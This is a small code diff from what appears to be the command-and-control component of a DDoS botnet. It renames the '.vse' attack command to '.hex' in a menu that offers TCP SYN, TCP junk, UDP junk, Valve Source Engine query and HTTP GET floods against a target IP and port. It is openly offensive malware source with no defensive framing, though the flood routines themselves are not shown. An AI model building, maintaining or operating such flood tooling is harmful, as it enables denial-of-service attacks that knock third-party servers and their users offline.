@@ -122,7 +122,7 @@ def command_line(client):
                 send(client, '.syn: TCP SYN flood')
                 send(client, '.tcp: TCP junk flood')
                 send(client, '.udp: UDP junk flood')
-                send(client, '.vse: UDP Valve Source Engine specific flood')
+                send(client, '.hex: UDP Valve Source Engine specific flood')
                 send(client, '.http: HTTP GET request flood')
                 send(client, '')
 
@@ -137,7 +137,7 @@ def command_line(client):
                 break
             
             # Valve Source Engine query flood
-            elif command == '.VSE':
+            elif command == '.HEX':
                 if len(args) == 4:
                     ip = args[1]
                     port = args[2]
